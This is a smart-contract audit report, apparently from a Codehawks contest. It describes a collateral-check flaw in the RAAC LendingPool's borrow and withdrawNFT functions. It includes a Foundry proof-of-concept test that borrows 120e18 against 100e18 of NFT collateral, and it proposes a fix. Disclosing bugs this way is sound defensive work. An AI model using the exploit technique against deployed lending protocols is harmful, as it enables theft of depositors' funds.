---
# Core Classification
protocol: Core Contracts
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 57177
audit_firm: Codehawks
contest_link: https://codehawks.cyfrin.io/c/cm5vbyum90000ffs0xblmb4gj
source_link: none
github_link: https://github.com/Cyfrin/2025-02-raac

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 0.00
financial_impact: high

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 123
finders:
  - newspacexyz
  - rolando
  - holydevoti0n
  - 0x180db
  - valy001
---

## Vulnerability Title

Users can borrow more assets than they have deposited as collateral

### Overview


This bug report highlights a vulnerability in the code that allows users to borrow more assets than they have deposited as collateral. This can lead to users taking away protocol assets by repeatedly borrowing and lending externally. The issue lies in the way the code checks if the user has enough collateral, as it miscalculates the amount required for borrowing. This vulnerability can be exploited in the `DebtToken::borrow` and `withdrawNFT` functions. A proof of concept has been provided and manual code review and Foundry were used to identify the issue. To mitigate this vulnerability, the code needs to be updated to correctly calculate the amount of collateral required for borrowing and withdrawing NFTs.

### Original Finding Content

## 01. Relevant GitHub Links

&#x20;

* [LendingPool.sol#L344](https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/pools/LendingPool/LendingPool.sol#L344)

## 02. Summary

The `DebtToken::borrow` function incorrectly verifies whether the user has sufficient collateral, allowing them to borrow more than expected.

## 03. Vulnerability Details

There is an issue in the `DebtToken::borrow` function where it checks if the user has enough collateral.

```
function borrow(uint256 amount) external nonReentrant whenNotPaused onlyValidAmount(amount) {
    if (isUnderLiquidation[msg.sender]) revert CannotBorrowUnderLiquidation();

    UserData storage user = userData[msg.sender];

    uint256 collateralValue = getUserCollateralValue(msg.sender);

    if (collateralValue == 0) revert NoCollateral();

    // Update reserve state before borrowing
    ReserveLibrary.updateReserveState(reserve, rateData);

    // Ensure sufficient liquidity is available
    _ensureLiquidity(amount);

    // Fetch user's total debt after borrowing
    uint256 userTotalDebt = user.scaledDebtBalance.rayMul(reserve.usageIndex) + amount;

    // Ensure the user has enough collateral to cover the new debt
@>  if (collateralValue < userTotalDebt.percentMul(liquidationThreshold)) {
        revert NotEnoughCollateralToBorrow();
    }

    // Update user's scaled debt balance
    uint256 scaledAmount = amount.rayDiv(reserve.usageIndex);
    
    ...
```

Because `percentMul(liquidationThreshold)` is calculated on userTotalDebt, the amount of collateral required for the user to borrow is smaller.

이 문제는 withdrawNFT 함수에서도 나타난다. userDebt을 percentMul(liquidationThreshold)로 계산하기 때문에 사용자가 필요한 담보가 더 적게 계산된다.

```
/**
 * @notice Allows a user to withdraw an NFT
 * @param tokenId The token ID of the NFT to withdraw
 */
function withdrawNFT(uint256 tokenId) external nonReentrant whenNotPaused {
    if (isUnderLiquidation[msg.sender])
        revert CannotWithdrawUnderLiquidation();

    UserData storage user = userData[msg.sender];
    if (!user.depositedNFTs[tokenId]) revert NFTNotDeposited();

    // update state
    ReserveLibrary.updateReserveState(reserve, rateData);

    // Check if withdrawal would leave user undercollateralized
    uint256 userDebt = user.scaledDebtBalance.rayMul(reserve.usageIndex);
    uint256 collateralValue = getUserCollateralValue(msg.sender);
    uint256 nftValue = getNFTPrice(tokenId);

    if (
        collateralValue - nftValue <
@>      userDebt.percentMul(liquidationThreshold)
    ) {
        revert WithdrawalWouldLeaveUserUnderCollateralized();
    }
```

## 04. Impact

* Since users can borrow more value than their collateral, they can repeat the process of buying NFTs and lending externally to take away protocol assets.

## 05. Proof of Concept

If you run the PoC with the command `forge test --mt test_poc_user_can_borrow_more_than_collateralValue`, you can see that you have deposited 100e18 nft but can borrow 120e18.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";

import {crvUSDToken} from "src/mocks/core/tokens/crvUSDToken.sol";
import {RAACHousePrices} from "src/core/primitives/RAACHousePrices.sol";
import {RAACNFT} from "src/core/tokens/RAACNFT.sol";

import {RToken} from "src/core/tokens/RToken.sol";
import {DebtToken} from "src/core/tokens/DebtToken.sol";
import {LendingPool} from "src/core/pools/LendingPool/LendingPool.sol";

import {ReserveLibrary} from "src/libraries/pools/ReserveLibrary.sol";

contract BaseTest is Test {
    crvUSDToken public crvUSDTokenInstance;
    RAACHousePrices public raacHousePricesInstance;
    RAACNFT public raacNFTInstance;
    RToken public rTokenInstance;
    DebtToken public debtTokenInstance;
    LendingPool public lendingPoolInstance;

    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address hyuunn = makeAddr("hyuunn");

    function setUp() public {
        // crvUSDToken deploy
        crvUSDTokenInstance = new crvUSDToken(address(this));

        // raacHousePrices deploy
        raacHousePricesInstance = new RAACHousePrices(address(this));
        raacHousePricesInstance.setOracle(address(this));

        // raacNFT deploy
        raacNFTInstance = new RAACNFT(
            address(crvUSDTokenInstance),
            address(raacHousePricesInstance),
            address(this)
        );

        _mintRaacNFT();

        rTokenInstance = new RToken(
            "RToken",
            "RTK",
            address(this),
            address(crvUSDTokenInstance)
        );
        debtTokenInstance = new DebtToken("DebtToken", "DEBT", address(this));

        lendingPoolInstance = new LendingPool(
            address(crvUSDTokenInstance),
            address(rTokenInstance),
            address(debtTokenInstance),
            address(raacNFTInstance),
            address(raacHousePricesInstance),
            0.1e27
        );

        rTokenInstance.setReservePool(address(lendingPoolInstance));
        debtTokenInstance.setReservePool(address(lendingPoolInstance));
    }

    function _mintRaacNFT() internal {
        // housePrices setting
        raacHousePricesInstance.setHousePrice(0, 100e18);
        raacHousePricesInstance.setHousePrice(1, 50e18);
        raacHousePricesInstance.setHousePrice(2, 150e18);

        // crvUSDToken mint
        deal(address(crvUSDTokenInstance), alice, 1000e18);
        deal(address(crvUSDTokenInstance), bob, 1000e18);
        deal(address(crvUSDTokenInstance), hyuunn, 1000e18);

        // raacNFT mint
        vm.startPrank(alice);
        crvUSDTokenInstance.approve(address(raacNFTInstance), 100e18 + 1);
        raacNFTInstance.mint(0, 100e18 + 1);
        vm.stopPrank();

        vm.startPrank(bob);
        crvUSDTokenInstance.approve(address(raacNFTInstance), 50e18 + 1);
        raacNFTInstance.mint(1, 50e18 + 1);
        vm.stopPrank();
    }

    function test_poc_user_can_borrow_more_than_collateralValue() public {
        // 1. bob deposit
        vm.startPrank(bob);
        crvUSDTokenInstance.approve(address(lendingPoolInstance), 500e18);
        lendingPoolInstance.deposit(500e18);
        vm.stopPrank();
        
        // 2. alice depositNFT 0
        // 2. 0 NFTs are worth 100E18
        vm.startPrank(alice);
        raacNFTInstance.approve(address(lendingPoolInstance), 0);
        lendingPoolInstance.depositNFT(0);

        assertEq(lendingPoolInstance.getUserCollateralValue(alice), 100e18);

        // 3. alice can borrow more than 100e18
        lendingPoolInstance.borrow(120e18);
    }

}
```

## 06. Tools Used

Manual Code Review and Foundry

## 07. Recommended Mitigation

```
function borrow(uint256 amount) external nonReentrant whenNotPaused onlyValidAmount(amount) {
    if (isUnderLiquidation[msg.sender]) revert CannotBorrowUnderLiquidation();

    UserData storage user = userData[msg.sender];

    uint256 collateralValue = getUserCollateralValue(msg.sender);

    if (collateralValue == 0) revert NoCollateral();

    // Update reserve state before borrowing
    ReserveLibrary.updateReserveState(reserve, rateData);

    // Ensure sufficient liquidity is available
    _ensureLiquidity(amount);

    // Fetch user's total debt after borrowing
    uint256 userTotalDebt = user.scaledDebtBalance.rayMul(reserve.usageIndex) + amount;

    // Ensure the user has enough collateral to cover the new debt
-   if (collateralValue < userTotalDebt.percentMul(liquidationThreshold)) {    
+   if (collateralValue.percentMul(liquidationThreshold) < userTotalDebt) {
        revert NotEnoughCollateralToBorrow();
    }

    // Update user's scaled debt balance
    uint256 scaledAmount = amount.rayDiv(reserve.usageIndex);
    
    ...

```

```diff
/**
 * @notice Allows a user to withdraw an NFT
 * @param tokenId The token ID of the NFT to withdraw
 */
function withdrawNFT(uint256 tokenId) external nonReentrant whenNotPaused {
    if (isUnderLiquidation[msg.sender])
        revert CannotWithdrawUnderLiquidation();

    UserData storage user = userData[msg.sender];
    if (!user.depositedNFTs[tokenId]) revert NFTNotDeposited();

    // update state
    ReserveLibrary.updateReserveState(reserve, rateData);

    // Check if withdrawal would leave user undercollateralized
    uint256 userDebt = user.scaledDebtBalance.rayMul(reserve.usageIndex);
    uint256 collateralValue = getUserCollateralValue(msg.sender);
    uint256 nftValue = getNFTPrice(tokenId);

    if (
-       collateralValue - nftValue <
+       (collateralValue - nftValue).percentMul(liquidationThreshold) <
-       userDebt.percentMul(liquidationThreshold)
+       userDebt
    ) {
        revert WithdrawalWouldLeaveUserUnderCollateralized();
    }

```

### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Codehawks |
| Protocol | Core Contracts |
| Report Date | N/A |
| Finders | newspacexyz, rolando, holydevoti0n, 0x180db, valy001, otor, bshyuunn, tejaswarambhe, aksoy, saurabh_singh, bluedragon, olugbenga, dobrevaleri, crunter, aravn, avci, oldguard, mill1995, sl1, h2134, bigsam, oxaudron, yovchevyoan, dimah7, falendar, 0xtimefliez, aestheticbhai, pabloperezacc6, 0xredtrama, x1485967, peanuts, modey, 1337web3, vasquez, 0xwhyzee, casinocompiler, 0x23r0, 0xdoko, fresh, theirrationalone, ace_30, 0x9527, joesepherus, foxb868, ke1cam, octeezy, shubu2581, elegantart306, 0xgee001, charlescheerful, pyro, 0rpseqwe, oxanmol, 6ty8ty, z3nithpu1se, vladislavvankov0, 0xekkoo, kirobrejka, whitekittyhacker, 2yzz, volifoet, sunless_, oldmonk, oxelmiguel, io10, tinnohofficial, kupiasec, 0xdarko, meeve, infect3d, elhajin, shuernchua, alexczm, s4muraii77, lamsy, t0x1c, yas000x, frndz0ne, kapten_crtz, bugger, kalii, opecon, holsstian, roccomania, gegul, stanchev, 0xmystery, anonymousjoe, glightspeed2 |

### Source Links

- **Source**: N/A
- **GitHub**: https://github.com/Cyfrin/2025-02-raac
- **Contest**: https://codehawks.cyfrin.io/c/cm5vbyum90000ffs0xblmb4gj

### Keywords for Search

`vulnerability`

